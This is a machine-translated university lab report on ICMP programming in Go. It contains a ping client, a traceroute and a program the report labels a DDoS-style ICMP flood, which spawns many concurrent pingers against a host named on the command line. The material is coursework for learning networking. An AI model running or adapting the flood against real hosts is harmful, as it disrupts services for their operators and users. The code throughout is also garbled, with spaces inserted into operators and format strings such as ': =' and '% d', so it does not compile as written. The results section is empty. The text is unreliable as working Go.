Federal State Budgetary Educational Institution
higher professional education
"Moscow State Technical University named after N. E. Bauman"
(MSTU. Bauman)



Faculty: Computer Science and Control Systems

Department: Theoretical Informatics and Computer Technologies







Laboratory work No. 3.2
"Development of ICMP applications"
at the rate: "COMPUTER NETWORKS"






Completed:
Student of group IU9-32B
Zhuk D.O.

Checked: 
Posevin D.P.


 
1. Purpose.
The goal of this lab is: developing ICMP applications in the GO language based on the packages github.com/go-ping/ping (main1.go, main2.go), github.com/lixiangzhong/traceroute (main3.go).
2. Problem conditions.
Implement ICMP applications on GO and run them. It is necessary to implement:
1) an application that sends ICMP packets to a given host and displays the response results (main1.go);
2) a type of DDoS attack such as ICMP flood using goroutines (main2.go);
3) trace to a given host (main3.go).

main1.go
package main

import (
 "log"
 "os"

 "github.com/go-ping/ping"
)

func main () {
 host: = os.Args [1]
 pinger, err: = ping.NewPinger (host)
 if err! = nil {
 log.Fatal (err)
 }

 pinger.OnRecv = func (pkt * ping.Packet) {
 log.Printf ("% d bytes from% s: icmp_seq =% d time =% v \ n",
 pkt.Nbytes, pkt.IPAddr, pkt.Seq, pkt.Rtt)
 }
 pinger.OnFinish = func (stats * ping.Statistics) {
 log.Printf ("---% s ping statistics --- \ n", stats.Addr)
 log.Printf ("% d packets transmitted,% d packets received,% v %% packet loss \ n",
 stats.PacketsSent, stats.PacketsRecv, stats.PacketLoss)
 log.Printf ("round-trip min / avg / max / stddev =% v /% v /% v /% v \ n",
 stats.MinRtt, stats.AvgRtt, stats.MaxRtt, stats.StdDevRtt)
 }

 log.Printf ("PING% s (% s): \ n", pinger.Addr (), pinger.IPAddr ())
 pinger.Count = 5
if err: = pinger.Run (); err! = nil {
 log.Fatal (err)
 }
}
 

main2.go
package main

import (
 "log"
 "os"
 "strconv"

 "github.com/go-ping/ping"
)

func run (host string, count int) {
 pinger, err: = ping.NewPinger (host)
 if err! = nil {
 log.Fatal (err)
 }

 pinger.OnRecv = func (pkt * ping.Packet) {
 log.Printf ("% d bytes from% s: icmp_seq =% d time =% v \ n",
 pkt.Nbytes, pkt.IPAddr, pkt.Seq, pkt.Rtt)
 }
 pinger.OnFinish = func (stats * ping.Statistics) {
 log.Printf ("---% s ping statistics --- \ n", stats.Addr)
 log.Printf ("% d packets transmitted,% d packets received,% v %% packet loss \ n",
 stats.PacketsSent, stats.PacketsRecv, stats.PacketLoss)
 log.Printf ("round-trip min / avg / max / stddev =% v /% v /% v /% v \ n",
 stats.MinRtt, stats.AvgRtt, stats.MaxRtt, stats.StdDevRtt)
 }

 log.Printf ("PING% s (% s): \ n", pinger.Addr (), pinger.IPAddr ())
 pinger.Count = count
if err: = pinger.Run (); err! = nil {
 log.Fatal (err)
 }
}

func main () {
 if len (os.Args) <= 3 {
 log.Fatal ("Small args")
 }
 host: = os.Args [1]
 count, err: = strconv.Atoi (os.Args [2])
 if err! = nil {
 log.Fatal (err)
 }
 num, err: = strconv.Atoi (os.Args [3])
 if err! = nil {
 log.Fatal (err)
 }

for i: = 0; i <num; i ++ {
 go run (host, count)
 }
 run (host, count)
}

 

main3.go

package main

import (
 "fmt"
 "log"
 "os"
 "time"

 "github.com/lixiangzhong/traceroute"
)

func main () {
 host: = os.Args [1]
 t: = traceroute.New (host)
 t.MaxTTL = 100
 t.Timeout = 1 * time.Second
 result, err: = t.Do ()
 if err! = nil {
 log.Fatal (err)
 }
 for _, v: = range result {
 fmt.Println (v)
 }
}


 


3. Execution results
 
